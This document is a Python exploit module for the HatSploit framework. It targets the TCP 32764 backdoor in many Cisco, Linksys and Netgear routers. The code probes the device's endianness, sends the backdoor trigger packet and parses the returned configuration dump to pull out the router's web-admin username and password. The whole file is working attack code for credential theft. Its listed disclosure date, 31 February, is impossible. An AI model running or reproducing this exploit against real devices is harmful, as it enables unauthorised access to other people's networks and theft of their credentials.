"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re
import struct

from badges.cmd import Command

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import TCP


class HatSploitModule(Module, TCP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "TCP 32764 Backdoor Credentials Disclosure",
            'Module': "exploit/linux/generic/32764_credentials_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
            ],
            'Description': (
                "Numerous router models have a backdoor installed allowing attacker "
                "to extract sensitive information including credentials and perform "
                "code execution."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "Cisco RVS4000 fwv 2.0.3.2 & 1.3.0.5",
                "Cisco WAP4410N",
                "Cisco WRVS4400N",
                "Cisco WRVS4400N",
                "Diamond DSL642WLG / SerComm IP806Gx v2 TI",
                "LevelOne WBR3460B",
                "Linksys RVS4000 Firmware V1.3.3.5",
                "Linksys WAG120N",
                "Linksys WAG160n v1 and v2",
                "Linksys WAG200G",
                "Linksys WAG320N",
                "Linksys WAG54G2",
                "Linksys WAG54GS",
                "Linksys WRT350N v2 fw 2.00.19",
                "Linksys WRT300N fw 2.00.17",
                "Netgear DG834",
                "Netgear DGN1000",
                "Netgear DGN2000B",
                "Netgear DGN3500",
                "Netgear DGND3300",
                "Netgear DGND3300Bv2 fwv 2.1.00.53_1.00.53GR",
                "Netgear DM111Pv2",
                "Netgear JNR3210",
            ],
            'References': [
                {'URL': 'https://github.com/elvanderb/TCP-32764'},
                {'URL': 'https://owasp.org/NINJA-PingU/research.html'}
            ],
            'DisclosureDate': "2013-02-31",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [RELIABLE_SESSION],
                'SideEffects': [],
            }
        })

        self.commands = [
            Command({
                'Name': 'get_endian',
                'Description': 'Get device endian (little/big).'
            })
        ]

    def __call__(self):
        self.port.visible = False
        self.port.set(32764)

    def detect_endian(self):
        client = self.open_tcp()
        client.connect()

        client.send(b"abcde")
        response = client.recv(0xC)
        client.disconnect()

        if len(response) < 12:
            return None

        sig, ret_val, ret_len = struct.unpack('<III', response)
        if sig == 0x53634D4D:
            return '<'
        if sig == 0x4D4D6353:
            return '>'
        return None

    def get_endian(self, _):
        if not self.host.value:
            self.print_warning("No HOST is set.")
            return

        self.print_process("Detecting endian...")

        endian = self.detect_endian()

        if endian == '<':
            self.print_information("Endian detected: little")
        elif endian == '>':
            self.print_information("Endian detected: big")
        else:
            self.print_error("Failed to detect endian!")

    def check(self):
        return self.is_on()

    def run(self):
        endian = self.detect_endian()

        if endian is None:
            return

        headers = struct.pack(endian + 'III', 0x53634D4D, 1, 1)
        trigger = headers + b'\x00'

        client = self.open_tcp()
        client.connect()

        client.send(trigger)
        response = client.recv(0xC)

        if len(response) < 12:
            self.print_warning("Target vulnerable, but no credentials found.")
            client.disconnect()
            return

        sig, ret_val, ret_len = struct.unpack(endian + 'III', response)
        response = client.recv(ret_len)
        client.disconnect()

        lines = re.split("\x00|\x01", response.decode())
        pattern = re.compile(r'user(name)?|password|login')

        username, password = "", ""
        for line in lines:
            try:
                variable, value = line.split("=")
                if len(value) > 0 and pattern.search(variable):
                    if variable == 'http_username':
                        username = value
                    elif variable == 'http_password':
                        password = value
            except Exception:
                pass

        if username and password:
            self.print_table(
                "Credentials", ('Username', 'Password'), (username, password)
            )
        else:
            self.print_warning("Target vulnerable, but no credentials found.")
